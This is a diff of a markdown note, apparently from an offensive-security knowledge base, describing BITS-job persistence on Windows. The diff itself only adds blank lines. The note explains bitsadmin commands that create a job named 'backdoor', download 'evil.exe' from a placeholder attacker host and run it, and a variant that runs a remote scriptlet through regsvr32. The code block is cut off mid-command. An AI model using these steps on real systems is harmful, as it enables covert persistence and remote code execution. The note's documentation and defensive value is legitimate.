@@ -29,11 +29,15 @@ BITS (Background Intelligent Transfer Service) is a Windows service that transfe
 
 BITS (Background Intelligent Transfer Service) is a Windows service that transfers files asynchronously between machines using idle network bandwidth. This technique can be used to establish persistence by creating a BITS task that downloads and executes a backdoor command. The backdoor command can be used to maintain access to the compromised machine, exfiltrate data, or perform other malicious activities. This technique can be difficult to detect because BITS jobs are often used for legitimate purposes and are not monitored by many security tools.
 
+ 
+
 ## Requirements
 
 1. Access to a user account with permission to create BITS jobs
 
 1. Ability to execute commands on the compromised machine
+
+ 
 
 ## Defense
 
@@ -43,6 +47,8 @@ BITS (Background Intelligent Transfer Service) is a Windows service that transfe
 
 1. Use endpoint detection and response (EDR) tools to monitor for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Establish persistence on the compromised machine
@@ -51,12 +57,20 @@ BITS (Background Intelligent Transfer Service) is a Windows service that transfe
 
 1. Exfiltrate data from the compromised machine
 
+ 
+
 # Instructions
 
 1. Use the bitsadmin command to create a backdoor and add a file to it. The command can be used in two ways, version 1 and version 2. Version 1 uses a local file while version 2 uses a remote file. The command also sets the minimum retry delay and resumes the backdoor.
 
+ 
+
+
+
 **Code**: [[bitsadmin /create backdoor
 bitsadmin /addfile back]]
+
+
 
 > The bitsadmin command is used to create a backdoor and add a file to it. The /create option is used to create a new job named 'backdoor'. The /addfile option is used to add a file to the job. In version 1, the file is a local file named 'evil.exe' which is added to the job with the path 'C:\tmp\evil.exe'. In version 2, the file is a remote file which is downloaded from the URL 'http://10.10.10.10/evil.exe' and added to the job with the same path. The /SetNotifyCmdLine option is used to set the command to be executed when the job is complete. In version 1, the command is set to 'C:\tmp\evil.exe NUL' which means that the file is executed silently. In version 2, the command is set to 'regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"' which means that a script is executed using regsvr32.exe. The /SetMinRetryDelay option is used to set the minimum retry delay to 60 seconds. The /resume option is used to start the job.
 
@@ -76,3 +90,5 @@ bitsadmin /addfile back]]
 - [[BITS Jobs]]
 - [[Simple User]]
 - [[Windows - Persistence]]
+
+
